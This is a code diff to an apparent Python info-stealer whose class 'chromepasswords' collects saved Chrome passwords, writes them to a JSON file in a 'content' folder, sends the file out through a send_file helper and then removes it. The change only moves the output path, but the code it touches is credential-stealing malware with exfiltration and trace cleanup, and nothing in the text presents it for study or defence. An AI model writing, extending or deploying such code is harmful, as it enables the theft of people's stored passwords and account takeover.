@@ -5,8 +5,12 @@ import json
 from send_file import send_file
 from removefile import removefile
 
+FOLDER_NAME = "content"
+FILE_NAME = "chrome_passwords.json"
+FILE_PATH = os.path.join(FOLDER_NAME, FILE_NAME)
+
 class chromepasswords:
-    def __init__(self, output_file='chrome_passwords.json'):
+    def __init__(self, output_file=FILE_PATH):
         self.output_file = output_file
 
     def get_passwords(self):
@@ -32,12 +36,15 @@ class chromepasswords:
         return passwords
 
     def write_passwords(self):
+        if not os.path.exists(FOLDER_NAME):
+            os.makedirs(FOLDER_NAME)
+
         passwords = self.get_passwords()
         with open(self.output_file, 'w') as f:
             f.write(json.dumps(passwords))
 
     def send_passwords(self):
-        send_file('chrome_passwords.json')
+        send_file(FILE_PATH)
     
     def remove(self):
-        removefile('chrome_passwords.json')
+        removefile(FILE_PATH)
